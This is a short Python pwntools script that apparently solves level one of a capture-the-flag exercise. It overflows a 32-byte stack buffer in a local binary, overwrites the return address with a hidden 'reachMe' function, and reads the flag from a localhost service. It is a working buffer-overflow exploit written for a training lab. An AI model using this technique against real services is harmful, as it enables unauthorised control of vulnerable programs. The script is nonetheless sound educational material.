#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.endian = "little"
context.log_level = "debug"

LVL_ONE_BINARY_PATH = "./lvl_1"
elf = ELF(LVL_ONE_BINARY_PATH)

CONNECTION_HOST = "localhost"
LVL_1_PORT = 4332

RIP_OFFSET = 40  # 32-byte buffer + 8-byte saved RBP

# Address of the hidden function
reachMe_address = elf.symbols["reachMe"]

log.info(f"Using binary      = {LVL_ONE_BINARY_PATH}")
log.info(f"reachMe address   = {hex(reachMe_address)}")
log.info(f"RIP offset        = {RIP_OFFSET}")

# Build payload:
# [ 'A' * offset ][ reachMe ]
payload = b"A" * RIP_OFFSET
payload += p64(reachMe_address)
payload += b"\n"

# Send payload
remote_connection = remote(CONNECTION_HOST, LVL_1_PORT)

print("Receiving welcome message...")
try:
    welcome_message = remote_connection.recvline(timeout=2)
    print(f"Welcome: {welcome_message}")
except Exception:
    print("No banner / welcome line")

print(f"Sending payload length: {len(payload)}")
remote_connection.send(payload)

print("Attempting to receive flag...")
try:
    lvl_1_flag = remote_connection.recvline(timeout=2)
    print(f"Flag (Level I): {lvl_1_flag}")
except Exception:
    print("No response (maybe check offset/address?)")

remote_connection.close()
